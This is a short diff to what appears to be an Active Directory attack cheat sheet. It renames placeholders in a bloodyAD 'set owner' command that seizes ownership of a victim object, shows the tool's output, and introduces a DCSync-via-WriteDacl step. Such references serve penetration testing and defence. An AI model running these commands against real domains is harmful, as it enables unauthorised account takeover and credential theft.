@@ -271,11 +271,11 @@ bloodyAD --host <DC_IP> -d <domain.local> \
 ``` Bash
 bloodyAD --host <DC_IP> -d <domain.local> \
   -u <attacker_SAM> -p <Hash NTLM or password> \
-  set owner <victim> <attacker_Sam>
+  set owner <victim_Sam> <attacker_Sam>
 ```
   - Output:
 ``` Output
-[+] Old owner S-1-5-21-... is now replaced by attacker_Sam on victim
+[+] Old owner S-1-5-21-... is now replaced by attacker_Sam on victim_Sam
 ```
 4. GrantDCSync (WriteDacl on Domain)
 ``` Bash
